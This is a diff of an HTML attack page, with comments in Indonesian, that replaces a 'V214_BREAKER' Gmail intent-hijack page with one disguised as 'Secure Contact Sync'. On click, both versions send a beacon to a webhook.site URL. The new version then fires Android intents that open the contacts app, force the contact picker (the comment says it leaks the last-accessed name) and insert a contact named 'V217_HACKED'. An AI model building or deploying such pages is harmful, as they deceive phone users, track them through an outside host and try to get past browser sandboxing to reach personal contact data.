@@ -1,60 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Sync V214</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-    <div id="ignite" style="padding:60px;border:3px solid #0f0;text-align:center;cursor:pointer;box-shadow:0 0 60px #0f0;border-radius:15px">
-        <h1 style="letter-spacing:5px">V214_BREAKER</h1>
-        <div id="status" style="font-size:18px">FORCE_GMAIL_PENETRATION</div>
-        <div style="font-size:11px;color:#444;margin-top:20px">BYPASSING_CHROME_146_FIREWALL</div>
+<head><title>Secure Contact Sync</title></head>
+<body style="background:#000;color:#fa0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:60px;border:3px solid #fa0;text-align:center;cursor:pointer;background:rgba(255,170,0,0.05);box-shadow:0 0 80px #fa0;border-radius:15px">
+        <h1 style="letter-spacing:10px;margin:0">V217_CONTACTS</h1>
+        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">ACCESSING_CONTACT_DATABASE...</div>
+        <div style="font-size:11px;color:#444">> TARGET: com.android.contacts</div>
     </div>
 
 <script>
-    const target = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
+    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
 
     document.getElementById('ignite').onclick = () => {
-        // 1. RECON (Bukti eksekusi)
-        navigator.sendBeacon(`${target}?v=V214_STRIKE`, btoa(JSON.stringify({ts: Date.now(), mode: "BRUTE"})));
+        // 1. SILENT RECON
+        navigator.sendBeacon(`${webhook}?v=V217_CONTACTS`, btoa(JSON.stringify({ts: Date.now(), act: "CONTACT_JUMP"})));
 
-        // 2. THE BRIDGE PAYLOAD
-        // Kita menggunakan mailto: tetapi memaksa Android memilih paket Gmail
-        // Ini melewati filter Chrome karena 'mailto:' dianggap protokol standar yang aman.
-        const mailtoScheme = "mailto:ecdnts@gmail.com?subject=V214_INJECTION&body=SENSITIVE_DATA_LINKED";
+        // 2. THE AGGRESSIVE CONTACT INTENTS
+        // Jalur A: Membuka Daftar Kontak Utama
+        const intentA = "intent:#Intent;action=android.intent.action.VIEW;data=content://contacts/people/;package=com.android.contacts;end";
         
-        // 3. THE INTENT FALLBACK (Versi yang lebih rapi untuk Chrome 146)
-        const intentScheme = 
-            "intent:ecdnts@gmail.com#Intent;" +
-            "action=android.intent.action.SENDTO;" +
-            "category=android.intent.category.DEFAULT;" +
-            "category=android.intent.category.BROWSABLE;" +
-            "package=com.google.android.gm;" + // Mengunci aplikasi
-            "S.browser_fallback_url=https://mail.google.com;" + 
-            "end";
+        // Jalur B: Memaksa Jendela "Pick Contact" (Seringkali membocorkan nama terakhir yang diakses)
+        const intentB = "intent:#Intent;action=android.intent.action.PICK;type=vnd.android.cursor.dir/contact;package=com.android.contacts;end";
 
-        // 4. THE SIMULTANEOUS STRIKE
-        // Kita tembak kedua-duanya dalam waktu bersamaan untuk memicu OS Intent Picker
-        
-        // Langkah 1: Picu lewat window location
-        window.location.href = mailtoScheme;
+        // Jalur C: Shortcut untuk menambah kontak baru (Injeksi data)
+        const intentC = "intent:#Intent;action=android.intent.action.INSERT;type=vnd.android.cursor.dir/contact;S.name=V217_HACKED;S.phone=08123456789;end";
 
-        // Langkah 2: Picu lewat hidden anchor setelah 100ms
+        // 3. THE EXECUTION
+        document.getElementById('status').innerText = "PENETRATING_CONTACT_APP...";
+        document.getElementById('status').style.color = "#f00";
+
+        // Tembak jalur utama
+        window.location.href = intentA;
+
+        // Tembak jalur seleksi (Jika jalur utama diblokir browser)
         setTimeout(() => {
             const a = document.createElement('a');
-            a.href = intentScheme;
+            a.href = intentB;
             a.click();
-            
-            document.getElementById('status').innerText = "JUMPING_TO_NATIVE_APP...";
-            document.getElementById('status').style.color = "#f00";
-        }, 100);
+        }, 200);
 
-        // Langkah 3: Jika masih gagal, paksa lewat iframe (Bypass Sandbox)
+        // Fallback: Jika masih di browser, coba injeksi kontak baru
         setTimeout(() => {
             if (!document.hidden) {
-                const ifr = document.createElement('iframe');
-                ifr.style.display = 'none';
-                ifr.src = intentScheme;
-                document.body.appendChild(ifr);
+                window.location.replace(intentC);
             }
-        }, 500);
+        }, 600);
     };
 </script>
 </body>
